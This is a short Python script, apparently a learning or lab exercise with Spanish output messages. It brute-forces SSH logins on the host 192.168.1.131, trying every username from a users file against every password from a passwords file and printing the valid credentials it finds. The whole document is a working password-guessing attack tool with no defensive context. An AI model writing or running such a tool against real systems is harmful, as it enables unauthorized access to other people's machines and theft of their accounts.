import pxssh

usuarios = open('users.txt', 'r')

for usuario in usuarios.read().split('\n'):
	passwords = open('passwords.txt','r')
	for password in passwords.read().split('\n'):	
		try:
			conectar = pxssh.pxssh()
			conectar.login('192.168.1.131',str(usuario),str(password))
			print("[*] Usuario y Password Validos !")
			print("[+] Usuario: {}".format(usuario))
			print("[+] Password: {}".format(password))
		except:
			#print("[-] Usuario y Password incorrectos!")
			pass
		